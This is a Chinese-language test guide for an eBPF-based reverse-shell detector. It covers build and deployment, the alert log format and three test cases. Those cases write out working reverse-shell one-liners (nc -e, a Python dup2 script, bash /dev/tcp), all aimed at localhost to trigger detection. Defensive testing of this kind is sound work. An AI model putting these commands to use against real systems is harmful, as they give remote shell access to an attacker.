# 反弹 Shell 检测 — 测试指南

## 测试目标

验证 ebpf_base_detector 插件的反弹 Shell 检测功能（DataType 6004）：eBPF 在 `sched_process_exec` Hook 中捕获进程执行事件，检查新进程的 FD 0（stdin）和 FD 1（stdout）是否指向 IPv4 Socket，任一指向 Socket 即触发告警。本文档选取 3 种典型反弹 Shell 手法进行验证，覆盖 nc -e、Python dup2、bash /dev/tcp 三种方式。

## 前置条件

| # | 检查项 | 检查命令 | 通过标准 |
|---|--------|---------|---------|
| 1 | 操作系统 | `uname -s` | 输出 `Linux` |
| 2 | 内核版本 | `uname -r` | 版本 >= 5.4 |
| 3 | BTF 支持 | `ls /sys/kernel/btf/vmlinux` | 文件存在 |
| 4 | root 权限 | `whoami` | 输出 `root` |
| 5 | 编译环境 | `go version` | Go 已安装 |
| 6 | nc 工具 | `nc.traditional -h 2>&1 \| head -1` | 输出包含 `netcat` |
| 7 | python3 | `python3 --version` | Python 3.x 已安装 |
| 8 | bash 版本 | `bash -c 'echo $BASH_VERSION'` | 输出版本号（非 dash/sh） |

如果任一条件不满足，测试无法进行。nc.traditional 可通过 `sudo apt install netcat-traditional` 安装。

---

## Step 1：编译部署

```bash
cd /home/work/goProject/src/company/agent
make build
make deploy
```

**验证**：执行 `ls -la /opt/cloudsec/agent/bin/agent /opt/cloudsec/agent/plugins/ebpf_base_detector/ebpf_base_detector`，两个文件都存在即成功。

---

## Step 2：启动 Agent

清空之前的测试输出并启动 Agent：

```bash
cd /opt/cloudsec/agent
rm -f /tmp/ebpf_test.log
sudo ./bin/agent -standalone -plugins=ebpf_base_detector -output=/tmp/ebpf_test.log -test
```

### 启动成功判定

在 Terminal A 的 stderr 输出中，**必须**看到以下日志行：

```
INFO  eBPF program loaded successfully
```

**判定规则**：
- 该行出现 → 启动成功，eBPF 程序已加载，进入 Step 3
- 该行未出现 → 启动失败，检查前置条件 2、3
- `failed to load eBPF` 错误 → 内核不支持，检查前置条件 2、3

### 日志位置

| 位置 | 说明 |
|------|------|
| Terminal A (stderr) | 操作日志（启动、错误等），用于确认启动状态 |
| `/opt/cloudsec/agent/logs/ebpf_base_detector.log` | 操作日志持久化文件 |
| `/tmp/ebpf_test.log` | **检测结果输出文件**，JSON 格式，每行一条记录，**主要验证位置** |

### 搜索技巧

检测结果以 JSON 格式写入 `/tmp/ebpf_test.log`，可使用以下方式查询：

```bash
# 搜索反弹 Shell 告警（按 data_type 过滤）
grep '"data_type":6004' /tmp/ebpf_test.log

# 按 fd_type 精确搜索
grep '"fd_type":"3"' /tmp/ebpf_test.log

# 按远程端口搜索
grep '"remote_port":"9001"' /tmp/ebpf_test.log

# 使用 jq 格式化输出（需安装 jq）
cat /tmp/ebpf_test.log | jq 'select(.data_type==6004)'

# 实时监控新告警
tail -f /tmp/ebpf_test.log
```

---

## Step 3：执行测试用例

每个测试需要 3 个终端：**Terminal A**（Agent，已在 Step 2 启动）、**Terminal B**（监听端）、**Terminal C**（触发端）。每执行一条后，检查 `/tmp/ebpf_test.log` 是否出现对应告警。

> **注意**：每个测试用例使用不同端口，避免端口冲突。测试完一个后在 Terminal B 按 Ctrl+C 关闭监听再进行下一个。

### 告警日志格式

每条告警在 `/tmp/ebpf_test.log` 中以一行 JSON 输出：

```json
{"timestamp":1234567890,"data_type":6004,"pid":"PID","tgid":"TGID","ppid":"PPID","uid":"UID","comm":"进程名","exe_path":"路径","fd_type":"类型","stdin_path":"stdin路径","stdout_path":"stdout路径","remote_ip":"IP","remote_port":"端口","rule_name":"规则名","confidence":"置信度","description":"描述"}
```

**fd_type 含义**：

| 值 | 含义 |
|----|------|
| 1 | 仅 stdin (FD 0) 指向 socket |
| 2 | 仅 stdout (FD 1) 指向 socket |
| 3 | stdin + stdout 都指向 socket |

### 通用判定规则

**PASS** 条件（全部满足）：
1. `/tmp/ebpf_test.log` 中出现 `"data_type":6004` 的 JSON 行
2. `"comm"` 与预期进程名一致
3. `"fd_type"` 值与预期一致
4. `"remote_ip"` 和 `"remote_port"` 与测试使用的监听地址一致

**FAIL** 条件（任一满足）：
- 执行命令后 5 秒内 `/tmp/ebpf_test.log` 无任何 `"data_type":6004` 的记录
- `"fd_type"`、`"remote_ip"` 或 `"remote_port"` 与预期不一致

---

### 用例 1：RS001 — nc -e 反弹 Shell

**检测原理**：nc 建立 TCP 连接后 fork+exec `/bin/bash`，子进程的 stdin/stdout 继承 socket FD。

**测试命令**：

Terminal B（监听端）：

```bash
nc -lvp 9001
```

Terminal C（触发端）：

```bash
nc.traditional -e /bin/bash 127.0.0.1 9001
```

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":6004,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"127.0.0.1","remote_port":"9001",...}
```

**验证命令**：

```bash
grep '"data_type":6004' /tmp/ebpf_test.log | grep '"remote_port":"9001"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9001"`。

> 说明：`fd_type=3` 表示 stdin(1) + stdout(2) = 3，两者都指向 socket。测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 用例 2：RS002 — Python dup2 反弹 Shell

**检测原理**：Python 创建 socket 连接后，用 `os.dup2()` 将 FD 0/1/2 全部指向 socket，然后 `subprocess.call` 内部调用 `execve("/bin/bash")`。新 bash 进程的 stdin/stdout 直接是 socket。

**测试命令**：

Terminal B（监听端）：

```bash
nc -lvp 9002
```

Terminal C（触发端）：

```bash
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":6004,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"127.0.0.1","remote_port":"9002",...}
```

**验证命令**：

```bash
grep '"data_type":6004' /tmp/ebpf_test.log | grep '"remote_port":"9002"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9002"`。

> 说明：测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

### 用例 3：RS003 — bash /dev/tcp 反弹 Shell

**检测原理**：外层 bash 通过内建的 `/dev/tcp` 虚拟文件创建 socket，`>&` 将 stdout/stderr 重定向到 socket，`0>&1` 将 stdin 重定向到 socket，然后 exec 内层 `bash -i`。

**测试命令**：

Terminal B（监听端）：

```bash
nc -lvp 9003
```

Terminal C（触发端）：

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9003 0>&1'
```

**预期日志**（`/tmp/ebpf_test.log`）：

```json
{"timestamp":...,"data_type":6004,"comm":"bash","exe_path":"/usr/bin/bash","fd_type":"3","remote_ip":"127.0.0.1","remote_port":"9003",...}
```

**验证命令**：

```bash
grep '"data_type":6004' /tmp/ebpf_test.log | grep '"remote_port":"9003"'
```

**PASS 判定**：上述命令有输出，且 JSON 中 `"comm":"bash"`，`"fd_type":"3"`，`"remote_port":"9003"`。

> 说明：必须使用 bash 而非 dash/sh，`/dev/tcp` 是 bash 内建功能。测试完成后在 Terminal B 输入 `exit` 关闭反弹 Shell，Ctrl+C 关闭监听。

---

## Step 4：记录测试结果

| # | 用例 ID | 测试手法 | 监听端口 | 预期 fd_type | 预期 | 实际 | PASS/FAIL |
|---|---------|----------|----------|-------------|------|------|-----------|
| 1 | RS001 | nc -e 反弹 | 9001 | 3 | 告警 | | |
| 2 | RS002 | Python dup2 反弹 | 9002 | 3 | 告警 | | |
| 3 | RS003 | bash /dev/tcp 反弹 | 9003 | 3 | 告警 | | |

---

## Step 5：清理与停止

```bash
# 1. Terminal B/C：关闭所有反弹 Shell 连接和监听
#    在 Terminal B 输入 exit，然后 Ctrl+C 关闭 nc 监听

# 2. Terminal A：按 Ctrl+C 停止 Agent

# 3. 清理输出文件（可选）
rm -f /tmp/ebpf_test.log
```

---

## 常见问题排查

| 问题现象 | 可能原因 | 排查步骤 |
|---------|---------|---------|
| Agent 启动报 `failed to load eBPF` | 内核不支持或无 root 权限 | 1) `whoami` 确认 root；2) `uname -r` 确认 >= 5.4；3) `ls /sys/kernel/btf/vmlinux` 确认 BTF |
| `/tmp/ebpf_test.log` 未生成 | Agent 未成功启动或路径无写权限 | 1) 确认 Terminal A 中出现 `detection results will be written to: /tmp/ebpf_test.log`；2) `ls -la /tmp/ebpf_test.log` 确认文件存在 |
| `nc -e` 报错 `invalid option` | 系统默认 nc 不支持 -e 选项 | 安装 `netcat-traditional`：`sudo apt install netcat-traditional`，使用 `nc.traditional -e` |
| bash /dev/tcp 报错 `No such file` | 使用了 dash/sh 而非 bash | 确认使用 bash：`bash -c 'echo $BASH_VERSION'`；确保触发命令以 `bash -c` 开头 |
| 命令执行了但无告警 | 监听端未启动或连接失败 | 1) 确认 Terminal B 的 `nc -lvp` 在运行；2) 确认端口号一致；3) 检查操作日志：`grep "Reverse shell" /opt/cloudsec/agent/logs/ebpf_base_detector.log` |
| fd_type=1 或 2（不是 3） | 只有一个 FD 指向 socket | 检查反弹命令是否正确重定向了 stdin 和 stdout；fd_type=1 表示仅 stdin，fd_type=2 表示仅 stdout |
| remote_ip 显示 0.0.0.0 | socket 未成功连接 | 检查 Terminal B 监听端是否在触发命令之前启动 |
| 告警延迟超过 5 秒 | standalone 刷新间隔较长 | 检查配置中 `flush_interval`（默认 1 秒）；eBPF 事件本身无延迟，延迟来自用户态轮询 |
